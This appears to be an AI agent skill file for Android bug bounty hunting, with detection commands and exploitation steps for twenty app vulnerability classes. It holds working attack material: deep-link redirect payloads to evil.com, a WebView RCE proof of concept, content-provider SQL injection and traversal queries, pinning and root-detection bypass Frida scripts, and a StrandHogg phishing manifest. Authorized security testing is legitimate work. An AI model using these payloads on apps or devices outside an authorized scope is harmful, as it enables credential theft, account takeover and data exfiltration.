---
name: android-security
description: Complete Android mobile bug bounty — 20 bug classes (hardcoded secrets, insecure storage, deep-link injection, WebView RCE, intent hijacking, content provider SQLi/traversal, cert pinning bypass, broadcast abuse, tapjacking, logging, backup extraction, root bypass, clipboard leakage, pending intent hijacking, fragment injection, StrandHogg/task hijacking, network security config, third-party SDK vulns, runtime permission abuse, notification leakage). Asset types — Play Store, .apk. Tools — apktool, jadx, Frida, objection, drozer, MobSF.
---

# ANDROID BUG BOUNTY — 20 Bug Classes

Root cause, detection, exploitation, tools, and real-world impact.

---

## ASSET ACQUISITION BY TYPE

### Android: Play Store
```bash
# Method 1: Pull from device (requires ADB + app installed)
adb shell pm list packages | grep target
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk target.apk

# Method 2: APK mirror sites (legal for in-scope targets)
# apkpure.com, apkmirror.com — download specific versions

# Method 3: gplaycli (Google Play CLI — requires Google credentials)
pip3 install gplaycli
gplaycli -d com.target.app -f target.apk

# Split APKs (modern apps use App Bundles)
adb shell pm path com.target.app
# May show: base.apk, split_config.arm64_v8a.apk, split_config.en.apk
# Pull ALL splits:
for apk in $(adb shell pm path com.target.app | sed 's/package://'); do
  adb pull "$apk" ./splits/
done
# Merge: java -jar APKEditor.jar m -i splits/ -o merged.apk
```

### Android: .apk (Direct APK file)
```bash
# Already have the APK — verify integrity
file target.apk                    # Should show: Zip archive data
aapt dump badging target.apk       # Package name, version, permissions
apksigner verify target.apk        # Signature validity

# If APK is split bundle (.apks / .xapk)
unzip target.xapk -d xapk_contents/
# Contains: base.apk + config APKs — merge or analyze base.apk

# Install on test device
adb install target.apk
adb install-multiple splits/*.apk  # For split APKs
```

---

## SETUP

```bash
# Static
sudo apt install -y apktool jadx
pip3 install frida-tools objection

# APK acquisition
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk target.apk

# Reverse
apktool d target.apk -o target_smali/
jadx -d target_java/ target.apk
```

---

## 1. HARDCODED SECRETS & API KEYS

```bash
grep -rn "api_key\|secret\|password\|token\|AKIA\|AIza" target_java/ \
  --include="*.java" --include="*.xml" | grep -v "R.java\|BuildConfig"

# Firebase open rules
curl -s "https://TARGET.firebaseio.com/.json"

# AWS key test
aws sts get-caller-identity --access-key-id AKIAXXXX --secret-access-key YYYY
```

**Impact:** Key alone = Informational. Prove access = Medium–Critical.

---

## 2. INSECURE DATA STORAGE

```bash
# SharedPreferences
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml

# SQLite
adb pull /data/data/com.target.app/databases/ ./dbs/
sqlite3 dbs/main.db "SELECT * FROM sessions;"

# External storage (world-readable)
grep -rn "getExternalStorageDirectory\|WRITE_EXTERNAL" target_java/ --include="*.java"
adb shell ls -la /sdcard/Android/data/com.target.app/
```

**Impact:** Plaintext tokens → High. PII in SQLite → Medium.

---

## 3. DEEP LINK INJECTION

```bash
# Discovery
grep -rn "android:scheme\|android:host" target_smali/AndroidManifest.xml

# Test
adb shell am start -a android.intent.action.VIEW -d "myapp://callback?url=https://evil.com"
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=javascript:alert(1)"
```

| Pattern | Payload | Impact |
|---|---|---|
| Open redirect | `myapp://auth?redirect=https://evil.com` | Token theft |
| XSS via WebView | `myapp://webview?url=javascript:alert(1)` | Session hijack |
| OAuth intercept | `myapp://oauth/callback?code=LEAKED` | ATO (Critical) |
| Path traversal | `myapp://file?path=../../etc/passwd` | File read |

---

## 4. WEBVIEW EXPLOITATION

```bash
# Critical misconfigs
grep -rn "addJavascriptInterface" target_java/ --include="*.java"
grep -rn "setAllowUniversalAccessFromFileURLs\|setAllowFileAccess" target_java/
grep -rn "loadUrl\|evaluateJavascript" target_java/ --include="*.java"
```

| Config | Impact | Severity |
|---|---|---|
| `addJavascriptInterface` + API < 17 | RCE | Critical |
| `setAllowUniversalAccessFromFileURLs(true)` | Read any file | High |
| `loadUrl(user_input)` no validation | XSS / phishing | High |

**RCE PoC (API < 17):**
```html
<script>AndroidBridge.getClass().forName("java.lang.Runtime")
  .getMethod("exec","java.lang.String").invoke(
  AndroidBridge.getClass().forName("java.lang.Runtime")
  .getMethod("getRuntime").invoke(null),"id")</script>
```

---

## 5. INTENT REDIRECTION / HIJACKING

```bash
# Exported components
grep -B2 -A10 "exported=\"true\"" target_smali/AndroidManifest.xml

# Launch unexported-looking activities
adb shell am start -n com.target.app/.InternalActivity
adb shell am start -n com.target.app/.AdminActivity

# drozer attack surface
run app.package.attacksurface com.target.app
run app.activity.start --component com.target.app com.target.app.AdminActivity
```

---

## 6. CONTENT PROVIDER VULNERABILITIES

```bash
# Discovery
grep -rn "content://" target_java/ --include="*.java"
grep -A10 "<provider" target_smali/AndroidManifest.xml

# SQLi via content provider
run app.provider.query content://com.target.app.provider/users \
  --selection "1=1) UNION SELECT sql FROM sqlite_master--"

# Path traversal
run app.provider.read content://com.target.app.provider/../../../../etc/hosts
```

---

## 7. CERTIFICATE PINNING BYPASS

```bash
# Frida universal bypass
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# objection one-liner
objection -g com.target.app explore -c "android sslpinning disable"
```

**Frida script (ssl_pinning_bypass.js):**
```javascript
Java.perform(function() {
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List')
        .implementation = function(hostname, peerCertificates) {
        console.log('[+] Bypassed pin for: ' + hostname);
    };
});
```

---

## 8. BROADCAST RECEIVER ABUSE

```bash
grep -B2 -A10 "<receiver" target_smali/AndroidManifest.xml | grep -A10 "exported=\"true\""

# Send crafted broadcast
adb shell am broadcast -a com.target.app.PAYMENT_CONFIRMED \
  --es "amount" "0" --es "order_id" "999"
```

---

## 9. TAPJACKING / OVERLAY ATTACKS

```bash
grep -rn "filterTouchesWhenObscured\|FLAG_WINDOW_IS_OBSCURED" target_java/
# If NOT present → vulnerable to tapjacking on sensitive dialogs
```

**PoC approach:**
```java
// Attacker app creates transparent overlay over target's confirm dialog
// User taps what they think is "Cancel" but actually taps "Confirm Transfer"
// Requires: SYSTEM_ALERT_WINDOW permission (grantable pre-Android 12)
```

**Impact:** Tapjacking on payment confirmation / permission grant → High.

---

## 10. INSECURE LOGGING

```bash
adb logcat -d | grep -iE "token|password|session|bearer|auth|secret"
grep -rn "Log\.\(d\|i\|v\|w\|e\)" target_java/ --include="*.java" | \
  grep -iE "token\|password\|secret\|auth"
```

---

## 11. BACKUP EXPLOITATION

```bash
grep "android:allowBackup" target_smali/AndroidManifest.xml
# If "true" or MISSING (default=true) → extract data:
adb backup -apk com.target.app -f backup.ab
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar xf backup.tar
```

---

## 12. ROOT DETECTION BYPASS

```javascript
// Frida script
Java.perform(function() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() { return false; };
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var p = this.getAbsolutePath();
        if (p.indexOf('su') !== -1 || p.indexOf('magisk') !== -1) return false;
        return this.exists();
    };
});
```

---

## 13. CLIPBOARD DATA LEAKAGE

```bash
# Check if app copies sensitive data to clipboard
grep -rn "ClipboardManager\|setPrimaryClip\|getText\|ClipData" target_java/ --include="*.java"

# Monitor clipboard on device
adb shell service call clipboard 2 s16 com.target.app

# Frida clipboard monitoring
```

**Frida script (clipboard_monitor.js):**
```javascript
Java.perform(function() {
    var ClipboardManager = Java.use('android.content.ClipboardManager');
    ClipboardManager.setPrimaryClip.implementation = function(clip) {
        var text = clip.getItemAt(0).getText();
        console.log('[CLIPBOARD] Data copied: ' + text);
        this.setPrimaryClip(clip);
    };
});
```

| Scenario | Impact |
|---|---|
| Password copied to clipboard | Any app reads it → Medium |
| Auth token/session ID in clipboard | Session hijack → High |
| Credit card / PII in clipboard | Data theft → High |
| Clipboard read on app resume (pre-Android 12) | Silent exfil → Medium |

**Note:** Android 12+ restricts clipboard access for background apps, but foreground malicious apps can still read.

---

## 14. PENDING INTENT HIJACKING

```bash
# Find PendingIntents with implicit intents (no target component)
grep -rn "PendingIntent\.\(getActivity\|getBroadcast\|getService\)" target_java/ --include="*.java"
grep -rn "new Intent()" target_java/ --include="*.java" | grep -v "setComponent\|setClass\|setPackage"

# Vulnerable pattern: PendingIntent wraps implicit Intent
# Attacker declares matching intent-filter → receives the PendingIntent
```

**Vulnerable code pattern:**
```java
// VULNERABLE — implicit intent in PendingIntent
Intent intent = new Intent("com.target.app.ACTION_COMPLETE");
intent.putExtra("auth_token", token);
PendingIntent pi = PendingIntent.getBroadcast(ctx, 0, intent,
    PendingIntent.FLAG_UPDATE_CURRENT);  // Missing FLAG_IMMUTABLE

// SECURE — explicit intent + FLAG_IMMUTABLE
Intent intent = new Intent(ctx, MyReceiver.class);
PendingIntent pi = PendingIntent.getBroadcast(ctx, 0, intent,
    PendingIntent.FLAG_IMMUTABLE);
```

| Pattern | Impact |
|---|---|
| PendingIntent with auth token via implicit intent | Token theft → High |
| Notification PendingIntent hijacked | Redirect user action → Medium |
| `FLAG_MUTABLE` + implicit base intent (API 31+) | Intent injection → High |

---

## 15. FRAGMENT INJECTION

```bash
# Check for PreferenceActivity (vulnerable pre-API 19)
grep -rn "PreferenceActivity\|getFragmentClass\|isValidFragment" target_java/ --include="*.java"
grep -rn "extends PreferenceActivity" target_java/ --include="*.java"

# If isValidFragment() not overridden → arbitrary fragment loading
adb shell am start -n com.target.app/.SettingsActivity \
  -e ":android:show_fragment" "com.target.app.InternalAdminFragment"
```

**Exploitation:**
```bash
# Load arbitrary fragment (bypasses access control)
adb shell am start -n com.target.app/.SettingsActivity \
  --es ":android:show_fragment" "com.target.app.ChangePasswordFragment" \
  --es ":android:show_fragment_arguments" "userId=VICTIM_ID"

# Chain: fragment injection → access admin preferences → privilege escalation
```

**Impact:** Load internal/admin fragments → bypass auth → High. Crash/DoS via invalid fragment → Low.

---

## 16. TASK HIJACKING (StrandHogg)

```bash
# StrandHogg 1.0 — taskAffinity + allowTaskReparenting
grep -rn "taskAffinity\|allowTaskReparenting\|launchMode" target_smali/AndroidManifest.xml

# Check for singleTask activities (susceptible to task injection)
grep -B5 -A5 "launchMode=\"singleTask\"" target_smali/AndroidManifest.xml

# StrandHogg 2.0 — no manifest markers needed (CVE-2020-0096, patched API 29+)
# Test on devices running Android 9 or lower
```

**Attack scenario:**
```
1. Victim opens target app (banking app)
2. Attacker app sets same taskAffinity as target
3. Attacker app's activity appears ON TOP of target's task
4. User sees fake login → enters credentials → sent to attacker
5. Attacker app finishes → real app visible → user suspects nothing
```

**PoC (attacker app manifest):**
```xml
<activity android:name=".PhishingActivity"
    android:taskAffinity="com.target.bank"
    android:allowTaskReparenting="true"
    android:excludeFromRecents="true">
</activity>
```

| StrandHogg Version | Requirement | Impact |
|---|---|---|
| 1.0 (taskAffinity) | Target has explicit taskAffinity | Phishing / credential theft → Critical |
| 2.0 (CVE-2020-0096) | Target on Android ≤ 9 | Full activity impersonation → Critical |
| Task injection (singleTask) | Target uses singleTask launch mode | Intent injection into target's task → High |

---

## 17. NETWORK SECURITY CONFIG WEAKNESSES

```bash
# Check for network_security_config.xml
find target_smali/ -name "network_security_config.xml"
cat target_smali/res/xml/network_security_config.xml

# Check AndroidManifest for cleartext
grep "usesCleartextTraffic\|networkSecurityConfig" target_smali/AndroidManifest.xml
```

**Dangerous configurations:**
```xml
<!-- VULNERABLE: allows cleartext (HTTP) to all domains -->
<network-security-config>
    <base-config cleartextTrafficPermitted="true" />
</network-security-config>

<!-- VULNERABLE: trusts user-installed CAs (debug left in prod) -->
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="user" />   <!-- Should only be in debug -->
            <certificates src="system" />
        </trust-anchors>
    </base-config>
</network-security-config>

<!-- VULNERABLE: domain allows cleartext -->
<domain-config cleartextTrafficPermitted="true">
    <domain includeSubdomains="true">api.target.com</domain>
</domain-config>
```

| Config Issue | Impact |
|---|---|
| `cleartextTrafficPermitted="true"` (base) | MitM all traffic → High |
| User CA trust in production build | Proxy intercept without bypass → Medium |
| Per-domain HTTP exception to API endpoint | Credential sniffing on that domain → High |
| Missing network security config entirely (API < 28) | Defaults to allow cleartext → Medium |

---

## 18. THIRD-PARTY SDK VULNERABILITIES

```bash
# Find embedded libraries
ls target_smali/lib/
find target_java/ -path "*/com/google/*" -o -path "*/com/facebook/*" \
  -o -path "*/io/branch/*" -o -path "*/com/adjust/*" | head -20

# Check SDK versions
grep -rn "VERSION\|version" target_java/ --include="*.java" | \
  grep -iE "sdk\|library\|firebase\|facebook\|crashlytics"
strings target.apk | grep -iE "sdk.*version\|version.*[0-9]\.[0-9]"

# Known vulnerable SDKs
# - Facebook SDK < 13.0 (access token leakage via deep links)
# - Firebase dynamic links (open redirect)
# - Branch.io (deep link injection)
# - Adjust SDK (PII leakage to third-party)
# - WebView-based ad SDKs (JavaScript bridge exploitation)
```

**Analytics SDK data exfiltration:**
```bash
# Intercept traffic with Burp after pinning bypass
# Filter for third-party analytics domains:
# - graph.facebook.com
# - app-measurement.com (Firebase Analytics)
# - api2.branch.io
# - app.adjust.com

# Check what PII is being sent:
# - Device IDs, email, location, browsing behavior
# - If sending without user consent → GDPR violation (some programs reward)
```

| Issue | Impact |
|---|---|
| Outdated SDK with known CVE | Depends on CVE → Medium–Critical |
| SDK sending PII without consent | Privacy violation → Medium |
| Ad SDK with unprotected JavaScript bridge | RCE via malicious ad → High |
| Analytics SDK leaking auth tokens | Session hijack → High |

---

## 19. RUNTIME PERMISSION ABUSE

```bash
# List all permissions requested
aapt dump permissions target.apk

# Check for dangerous permissions
grep -rn "android.permission\.\(CAMERA\|RECORD_AUDIO\|READ_CONTACTS\|ACCESS_FINE_LOCATION\|READ_SMS\|READ_CALL_LOG\|READ_PHONE_STATE\)" target_smali/AndroidManifest.xml

# Check if permissions are actually used where needed
grep -rn "checkSelfPermission\|requestPermissions\|onRequestPermissionsResult" target_java/ --include="*.java"
```

**Vulnerable patterns:**
```java
// VULNERABLE — performing sensitive action without runtime permission check
public void getLocation() {
    Location loc = locationManager.getLastKnownLocation(GPS_PROVIDER);
    // Never called checkSelfPermission first!
    sendToServer(loc);
}

// VULNERABLE — requesting excessive permissions upfront
// Manifest requests: CAMERA, CONTACTS, SMS, LOCATION, PHONE
// App only needs CAMERA → over-permission = unnecessary attack surface
```

| Pattern | Impact |
|---|---|
| Sensitive action without permission check | Unauthorized data access → Medium |
| Over-permissioned app (excessive permissions) | Larger attack surface → Informational |
| Permission granted but used for unrelated data collection | Privacy abuse → Medium |
| `SYSTEM_ALERT_WINDOW` + tapjacking chain | Overlay attack → High |

---

## 20. NOTIFICATION DATA LEAKAGE

```bash
# Check for sensitive data in notifications
grep -rn "NotificationCompat\|Notification\.Builder\|setContentText\|setContentTitle" \
  target_java/ --include="*.java"

# On device — capture notifications
adb shell dumpsys notification --noredact

# Check if notifications show on lock screen
grep -rn "setVisibility\|VISIBILITY_PUBLIC\|VISIBILITY_SECRET\|VISIBILITY_PRIVATE" \
  target_java/ --include="*.java"
```

**Vulnerable patterns:**
```java
// VULNERABLE — OTP in notification text (visible on lock screen)
new NotificationCompat.Builder(ctx, CHANNEL)
    .setContentTitle("Verification Code")
    .setContentText("Your OTP is: 483921")   // Visible to anyone!
    .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)  // Shows on lock screen
    .build();

// SECURE
new NotificationCompat.Builder(ctx, CHANNEL)
    .setContentTitle("Verification")
    .setContentText("Tap to view your code")
    .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // Hidden on lock screen
    .build();
```

| Scenario | Impact |
|---|---|
| OTP/2FA code in notification body | Shoulder surfing / lock screen read → Medium |
| Auth token in notification extras | Any notification listener app reads it → High |
| PII (transaction details, messages) visible on lock screen | Privacy breach → Medium |
| `NotificationListenerService` + no filtering | Malicious app reads all notifications → High |

---

## HUNTING CHECKLIST

```
[ ] APK acquired (Play Store / direct .apk / split APK merged)
[ ] APK decompiled (apktool + jadx)
[ ] Hardcoded secrets grepped + access tested
[ ] AndroidManifest.xml — exported components reviewed
[ ] Deep links enumerated + fuzzed
[ ] WebView configs checked (JSInterface, file access)
[ ] Content providers queried for SQLi / path traversal
[ ] Cert pinning bypassed, traffic intercepted via Burp
[ ] SharedPreferences + SQLite inspected
[ ] External storage checked
[ ] Logcat monitored for sensitive data
[ ] Backup flag checked
[ ] Broadcast receivers tested
[ ] Clipboard data checked for sensitive content
[ ] PendingIntents audited for implicit intents
[ ] Fragment injection tested on PreferenceActivity
[ ] Task affinity / StrandHogg checked
[ ] Network security config reviewed (cleartext, CA trust)
[ ] Third-party SDKs inventoried + version checked
[ ] Runtime permissions audited
[ ] Notification content reviewed for sensitive data
```
